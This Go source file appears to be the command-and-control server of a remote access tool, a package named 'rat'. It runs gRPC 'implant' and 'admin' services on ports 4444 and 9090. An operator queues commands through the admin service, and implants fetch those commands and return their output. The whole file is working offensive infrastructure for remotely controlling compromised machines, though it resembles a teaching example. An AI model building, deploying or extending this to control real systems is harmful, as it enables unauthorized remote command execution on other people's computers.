package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"

	"cleonty/rat/grpcapi"

	"google.golang.org/grpc"
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

// NewImplantServer creates new implantServer instance
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

// NewAdminServer creates new adminServer instance
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

// FetchCommand asks implantServer for a new command
func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	fmt.Printf("implant server asked for a new command\n")
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			fmt.Printf("implant returns command %s\n", cmd.In)
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// No work
		return cmd, nil
	}
}

// SendOutput outputs result
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	fmt.Printf("implant server sends output\n")
	s.output <- result
	return &grpcapi.Empty{}, nil
}

// RunCommand receives a Command that has not yet been sent to the implant
func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		fmt.Printf("admin server about to send command %s to implant via channel\n", cmd.In)
		s.work <- cmd
		fmt.Printf("admin server sent command %s to implant via channel\n", cmd.In)
	}()
	res = <-s.output
	fmt.Printf("admin server get output for command %s from implant\n", cmd.In)
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("implant server started at port %d\n", 4444)
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("admin server started at port %d\n", 9090)
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
